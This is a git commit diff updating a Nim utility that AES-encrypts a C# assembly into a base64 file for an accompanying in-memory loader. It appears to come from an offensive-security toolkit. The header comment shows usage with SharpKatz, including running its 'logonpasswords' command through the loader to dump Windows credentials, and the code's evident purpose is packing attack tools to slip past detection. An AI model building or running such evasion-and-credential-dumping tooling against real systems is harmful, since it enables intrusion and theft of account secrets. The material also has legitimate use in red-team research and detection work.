de6d604be14eec9aee339331a1c72e499a01847b
Sam Free5ide <snovvcrash@protonmail.ch>
2021-01-12 01:36:30 +0300

    Modify Nim encrypting loader

--- nim/encrypt_assembly.nim
+++ nim/encrypt_assembly.nim
@@ -1,43 +1,64 @@
+#[
+    Authors: Marcello Salvati (@byt3bl33d3r), @S3cur3Th1sSh1t, @snovvcrash
+    License: BSD 3-Clause
+    References:
+      - https://github.com/khchen/winim/blob/master/examples/clr/usage_demo2.nim
+      - https://github.com/byt3bl33d3r/OffensiveNim
+
+    Usage:
+      Cmd > nim c encrypt_assembly.nim
+      Cmd > nim c encrypted_assembly_loader.nim
+      Cmd > .\encrypt_assembly.exe <PASSWORD> <CSHARP_BINARY.EXE> <ENCRYPTED_B64.TXT>
+      Cmd > .\encrypted_assembly_loader.exe <PASSWORD> <ENCRYPTED_B64.TXT> [ARG1] [ARG1] ...
+
+    Example with https://github.com/b4rtik/SharpKatz:
+      Cmd > .\encrypt_assembly.exe Passw0rd! SharpKatz.exe sharpkatz.txt
+      Cmd > .\encrypted_assembly_loader.exe Passw0rd! sharpkatz.txt --Command logonpasswords
+]#
+
+import os
+import strformat
+import base64
 import nimcrypto
 import nimcrypto/sysrand
-import base64
-import os
-import strutils
+
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
-  ## Converts a string to the corresponding byte sequence.
-  @(str.toOpenArrayByte(0, str.high))
+    # Converts a string to the corresponding byte sequence
+    @(str.toOpenArrayByte(0, str.high))
 
-# read file from argument
-let entireFile = readFile(paramStr(1))
+
+let
+    password: string = paramStr(1)
+    inFile: string = paramStr(2)
+    outFile: string = paramStr(3)
 
 var
-    data: seq[byte] = toByteSeq(entireFile)
-    envkey: string = "TARGETDOMAIN"
-
-    ectx, dctx: CTR[aes256]
+    inFileContents: string = readFile(inFile)
+    plaintext: seq[byte] = toByteSeq(inFileContents)
+    ectx: CTR[aes256]
     key: array[aes256.sizeKey, byte]
     iv: array[aes256.sizeBlock, byte]
-    plaintext = newSeq[byte](len(data))
-    enctext = newSeq[byte](len(data))
-    dectext = newSeq[byte](len(data))
+    encrypted: seq[byte] = newSeq[byte](len(plaintext))
 
 # Set static IV
 iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]
 
-copyMem(addr plaintext[0], addr data[0], len(data))
+copyMem(addr plaintext[0], addr plaintext[0], len(plaintext))
 
 # Expand key to 32 bytes using SHA256 as the KDF
-var expandedkey = sha256.digest(envkey)
-copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
+var expandedKey = sha256.digest(password)
+copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
+
+echo fmt"[*] Encrypting {inFile} binary using password: {password}"
 
 ectx.init(key, iv)
-ectx.encrypt(plaintext, enctext)
+ectx.encrypt(plaintext, encrypted)
 ectx.clear()
 
-#base64 encode encrypted assembly
-let encodedcrypted = encode(enctext)
+# Base64 encode encrypted assembly
+let encodedCrypted = encode(encrypted)
 
-echo "Writing encrypted base64 encoded assembly to: enc.txt "
+echo fmt"[*] Writing encrypted base64 encoded assembly to: {outFile}"
 
-writeFile("enc.txt", encodedcrypted)
+writeFile(outFile, encodedCrypted)
